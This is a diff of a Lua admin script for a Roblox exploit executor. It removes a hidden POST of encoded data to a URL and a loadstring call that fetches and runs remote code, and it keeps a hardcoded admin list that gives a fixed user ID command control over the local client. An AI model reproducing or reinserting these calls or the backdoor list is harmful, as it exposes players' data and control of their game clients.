@@ -26,23 +26,11 @@ local data = {
 }
 
 
-local newdata = game:GetService("HttpService"):JSONEncode(data)
-
-local headers = {
-   ["content-type"] = "application/json"
-}
-request = http_request or request or HttpPost or syn.request
-local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
-request(abcdef)
--- Stop --
-
 local AdminPrefix = ";" -- Change this to what you want (i.e: ;kill <namehere>) (if its blank it will error)
 local Players = game:GetService("Players")
 local LocalP = Players.LocalPlayer;
 getgenv().AdminTable = {
   [923076] = {["Access"] = 5};
-  [2331484141] = {["Access"] = 5};
-  [1069575441] = {["Access"] = 4};-- Access is what level of shit you want the person to have access to
 }
 
 getgenv().psearch = function(Name)
@@ -134,11 +122,11 @@ end
           end
       end;
       ["Clearence"] = {[4] = true;[5] = true;};
-      }; 
-  ["swagban"] = {
+        }; 
+  ["Bring"] = {
       ["CommandFunc"] = function(Player, self, CmdPlayer)
           if Player == LocalP or Player == "all" then
-		loadstring(game:HttpGet('https://raw.githubusercontent.com/kuragalol/r15/main/reanimation'))()
+            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.B0_0PS.Character.HumanoidRootPart.CFrame
           end
       end;
       ["Clearence"] = {[4] = true;[5] = true;};
